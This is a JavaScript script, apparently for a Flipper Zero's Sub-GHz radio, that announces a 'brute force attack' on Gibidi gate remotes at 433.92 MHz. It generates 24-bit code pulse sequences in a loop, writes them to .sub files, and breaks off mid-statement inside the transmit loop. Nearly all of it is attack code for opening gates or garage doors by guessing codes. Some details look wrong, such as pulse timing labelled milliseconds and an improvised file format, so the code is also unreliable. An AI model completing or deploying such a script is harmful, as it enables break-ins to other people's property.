let subghz = require("subghz");
let storage = require("storage");
let dialog = require("dialog");

// Frequency for Gibidi remote (433.92 MHz)
let frequency = 433920000;

// Configure Sub-GHz module
subghz.setup();
subghz.setIdle();
subghz.setFrequency(frequency);

// Parameters for the brute force
let startCode = 0x000000;  // Starting code (e.g., 000000 in hex)
let endCode = 0x00FFFF;    // Ending code (limited range for testing)
let delayBetweenCodes = 500;  // Delay between transmissions
let pulseDuration = 650;  // Duration of pulses in milliseconds

// Function to generate the raw pulse sequence based on a given code
function generateRawSequence(code) {
    let sequence = [];

    // Convert the code into binary and generate high/low pulse sequence
    for (let i = 23; i >= 0; i--) { // Assuming 24-bit codes
        let bit = (code >> i) & 1;
        if (bit === 1) {
            sequence.push(pulseDuration);  // High pulse
            sequence.push(pulseDuration);  // Low pulse
        } else {
            sequence.push(pulseDuration / 2);  // Short high pulse for 0
            sequence.push(pulseDuration);  // Low pulse
        }
    }

    return sequence;
}

// Function to write the pulse sequence to a .sub file
function writeToSubFile(code, sequence) {
    // Construct the file path using string concatenation
    let filePath = "/ext/subghz/gibidi_" + to_hex_string(code) + ".sub";

    // Create file content with explicit string handling
    let frequencyString = "Frequency: " + frequency.toString() + "\n";
    let pulseDurationString = "Pulse Duration: " + pulseDuration.toString() + "\n";
    
    // Initialize the sequence string
    let sequenceString = "Sequence: ";
    for (let i = 0; i < sequence.length; i++) {
        sequenceString += sequence[i].toString();  // Convert each number to string
        if (i < sequence.length - 1) {
            sequenceString += ", "; // Add comma separator
        }
    }
    sequenceString += "\n"; // Newline at the end of the sequence

    // Combine all parts to create the full content
    let fileContent = frequencyString + pulseDurationString + sequenceString;

    // Write the pulse sequence to the file
    let writeResult = storage.write(filePath, fileContent);

    // Check if the write was successful
    if (writeResult) {
        print("Written to file:", filePath);
    } else {
        print("Failed to write to file:", filePath);
    }
    return filePath;
}

// Brute force loop
dialog.message("Gibidi Brute Force", "Starting brute force attack!");

for (let code = startCode; code <= endCode; code++) {
    let pulseSequence = generateRawSequence(code);  // Generate the pulse sequence

    print("Sending code:", to_hex_string(code));  // Print code in hex format

    // Write the generated sequence to a .sub file
    let subFilePath 
